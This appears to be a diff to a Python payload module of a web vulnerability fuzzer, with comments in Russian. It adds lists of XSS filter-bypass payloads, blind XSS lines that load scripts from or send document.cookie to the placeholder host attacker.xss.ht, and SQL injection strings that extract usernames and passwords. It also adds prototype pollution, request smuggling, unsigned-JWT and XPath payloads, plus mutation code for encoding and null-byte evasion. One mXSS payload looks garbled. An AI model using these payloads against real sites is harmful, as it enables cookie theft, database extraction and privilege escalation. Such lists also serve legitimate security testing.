@@ -64,7 +64,35 @@ XSS_PAYLOADS: List[str] = [
     "<style>body{background:url(javascript:alert(1))}</style>",
     "<div style=\"width:expression(alert(1))\">",
 
+    # WAF Bypass
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<script/src=data:,alert(1)>",
+    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+    "<svg><set onbegin=alert(1) attributeName=x to=1>",
+    "<object data=javascript:alert(1)>",
+    "<embed src=javascript:alert(1)>",
+    "<a href=javascript:alert(1)>click</a>",
+    "<marquee onstart=alert(1)>",
+    "<isindex action=javascript:alert(1) type=image>",
+    "<form><button formaction=javascript:alert(1)>X</button>",
+    "<math><mrow><mi>x</mi><malignmark></malignmark></mrow><mglyph><svg><mtext><textarea><path id=x><animate attributeName=d values=M0telerik.com dur=1s></animate></path></textarea></mtext></svg></mglyph></math>",
 
+    # Blind XSS (OOB)
+    "<script src=//attacker.xss.ht></script>",
+    "'\"><script src=//attacker.xss.ht></script>",
+    "<img src=x onerror=fetch('//attacker.xss.ht/'+document.cookie)>",
+    "<svg/onload=fetch('//attacker.xss.ht/'+document.domain)>",
+
+    # Unicode / encoding bypass
+    "\u003cscript\u003ealert(1)\u003c/script\u003e",
+    "\x3cscript\x3ealert(1)\x3c/script\x3e",
+    "<script>al\\u0065rt(1)</script>",
+
+    # Mutation XSS (mXSS)
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "<listing><img src=1 onerror=alert(1)>//</listing>",
+    "<xmp><p title=\"</xmp><svg/onload=alert(1)>\">",
 ]
 
 # ============================================================
@@ -155,6 +183,41 @@ FUZZ_PAYLOADS: List[str] = [
     "{{document.body.innerText}}",
     "${document.body.innerText}",
     "'+document.body.innerText+'",
+
+    # Blind SQLi (time-based)
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "1' AND BENCHMARK(5000000,SHA1('test'))--",
+    "'; SELECT pg_sleep(5)--",
+
+    # SQLi UNION advanced
+    "' UNION SELECT username,password FROM users--",
+    "' UNION ALL SELECT NULL,NULL,NULL--",
+    "' ORDER BY 100--",
+
+    # Host Header Injection
+    "evil.com",
+    "localhost@evil.com",
+    "evil.com%00.target.com",
+
+    # HTTP Request Smuggling markers
+    "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
+
+    # Prototype Pollution
+    "__proto__[isAdmin]=true",
+    "constructor[prototype][isAdmin]=true",
+    "__proto__.polluted=true",
+
+    # GraphQL Injection
+    "{__schema{types{name,fields{name}}}}",
+    "{__type(name:\"User\"){name,fields{name,type{name}}}}",
+
+    # JWT manipulation
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
+
+    # XPATH Injection
+    "' or '1'='1",
+    "' or ''='",
+    "1' or '1'='1' or '1'='1",
 ]
 
 # ============================================================
@@ -222,13 +285,26 @@ class PayloadGenerator:
         variants = [
             base.replace("<", "%3C").replace(">", "%3E"),
             base.replace("alert", "confirm"),
+            base.replace("alert", "prompt"),
             base.replace("script", "sCrIpT"),
+            base.replace("script", "scr\x00ipt"),
             base + f"<!--{randint(100, 999)}-->",
             base.replace("1", str(randint(2, 9))),
             base.replace("XSS", f"X{randint(100, 999)}"),
             base.replace("document.cookie", "document.domain"),
             base.replace("document.cookie", "navigator.userAgent"),
             base.replace("document.cookie", "window.location.href"),
+            # Double-encoding
+            base.replace("<", "%253C").replace(">", "%253E"),
+            # Unicode escapes
+            base.replace("<", "\\u003c").replace(">", "\\u003e"),
+            # Case randomization
+            "".join(c.upper() if randint(0, 1) else c.lower() for c in base),
+            # Null-byte injection
+            base[:len(base)//2] + "%00" + base[len(base)//2:],
+            # Tab/newline insertion
+            base.replace(" ", "\t"),
+            base.replace(" ", "\n"),
         ]
         return choice(variants)
 
@@ -236,10 +312,40 @@ class PayloadGenerator:
 # ============================================================
 #  Публичный API модуля
 # ============================================================
+# ============================================================
+#  Специализированные генераторы
+# ============================================================
+def generate_sqli_payloads() -> List[str]:
+    """Возвращает только SQLi payloads из FUZZ_PAYLOADS."""
+    markers = ("OR", "UNION", "SELECT", "SLEEP", "BENCHMARK", "WAITFOR", "pg_sleep", "ORDER BY")
+    return [p for p in FUZZ_PAYLOADS if any(m in p.upper() for m in markers)]
+
+
+def generate_ssti_payloads() -> List[str]:
+    """Возвращает SSTI / Template Injection payloads."""
+    markers = ("{{7*7}}", "${7*7}", "#{7*7}", "config.__class__")
+    return [p for p in FUZZ_PAYLOADS if any(m in p for m in markers)]
+
+
+def generate_ssrf_payloads() -> List[str]:
+    """Возвращает SSRF payloads."""
+    return [p for p in FUZZ_PAYLOADS if p.startswith("http://")]
+
+
+def generate_cmdi_payloads() -> List[str]:
+    """Возвращает Command Injection payloads."""
+    markers = ("; ", "| ", "&& ", "`")
+    return [p for p in FUZZ_PAYLOADS if any(p.startswith(m.strip()) or m in p for m in markers)]
+
+
 __all__ = [
     "XSS_PAYLOADS",
     "FUZZ_PAYLOADS",
     "generate_xss_payloads",
     "generate_fuzz_payloads",
+    "generate_sqli_payloads",
+    "generate_ssti_payloads",
+    "generate_ssrf_payloads",
+    "generate_cmdi_payloads",
     "PayloadGenerator",
 ]
